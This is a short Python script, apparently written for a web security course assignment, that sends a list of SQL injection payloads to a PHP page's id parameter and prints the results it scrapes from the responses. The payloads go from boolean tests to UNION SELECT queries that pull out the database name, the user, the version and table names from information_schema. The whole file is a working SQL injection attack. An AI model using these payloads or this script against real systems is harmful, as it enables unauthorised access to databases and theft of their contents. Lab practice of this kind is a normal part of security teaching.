import requests
import re
def handle_regex_result(regex_result):
	result=[]
	for item in regex_result:
		result.append(item.replace('\r','').replace('\n','').replace('\t',''))
	return result
base_url="http://www.wsb.com/Assignment2/case24.php?id="
payload_list=["1","1' and '1'='1","1' and '1'='2",
"1' and 1=2 union select database(),user() --+",
"1' and 1=2 union select database(),version() --+",
"1' and 1=2 union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),version() --+"]
for payload in payload_list:
	r=requests.get(base_url+payload)
	#print(r.text)
	regex_result=re.findall('<\/form>([\w\s\d\-\.@,]*)<br/>',r.text)
	regex_result=handle_regex_result(regex_result)
	print("Payload:"+payload+" Result:",regex_result)
